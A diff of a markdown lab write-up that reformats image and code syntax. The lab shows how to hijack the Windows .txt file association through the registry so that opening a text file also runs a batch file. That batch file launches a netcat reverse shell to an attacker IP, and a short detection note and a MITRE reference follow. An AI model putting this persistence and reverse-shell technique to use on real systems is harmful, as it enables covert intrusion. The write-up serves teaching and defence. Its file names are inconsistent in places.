@@ -16,34 +16,33 @@ Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command
 
 Below shows that the command responsible for opening .txt files is `notepad.exe %1`, where `%1` is the argument for notepad.exe, which specifies a file name the notepad should open:
 
-![](<../../.gitbook/assets/image (427).png>)
+![[image (427).png]]
 
 Say, a target user has the file test.exe on his desktop with the below file contents:
 
-![](<../../.gitbook/assets/image (430).png>)
+![[image (430).png]]
 
 Let's now create a malicious file that we want to be executed when the user attempts to open the benign file test.txt. For this lab, the malicious file is going to be a simple Windows batch file located in c:\tools\shell.cmd:
 
-{% code title="c:\tools\shell.cmd" %}
 ```erlang
+// c:\tools\shell.cmd
 start C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
 start notepad.exe %1
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/image (429).png>)
+![[image (429).png]]
 
 Once executed, `c:\tools\hell.cmd` will launch a simple netcat reverse shell to the attacking system and also a notepad with the `test.txt` file as an argument.
 
 We are now ready to hijack the .txt file extension by modifying the value data of  `Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command` to `c:\tools\shell.cmd %1` as shown below:
 
-![](<../../.gitbook/assets/image (431).png>)
+![[image (431).png]]
 
 ## Demo
 
 Opening the test.txt file by double clikcing it opens the file itself, but a reverse shell is thrown to the attacking system as well:
 
-![](../../.gitbook/assets/hijacked-extension.gif)
+![[hijacked-extension.gif]]
 
 ## Detection
 
@@ -51,4 +50,4 @@ Defenders may want to monitor registry for file extension command changes, espec
 
 ## References
 
-{% embed url="https://attack.mitre.org/techniques/T1042/" %}
+[attack.mitre.org/techniques/T1042](https://attack.mitre.org/techniques/T1042/)
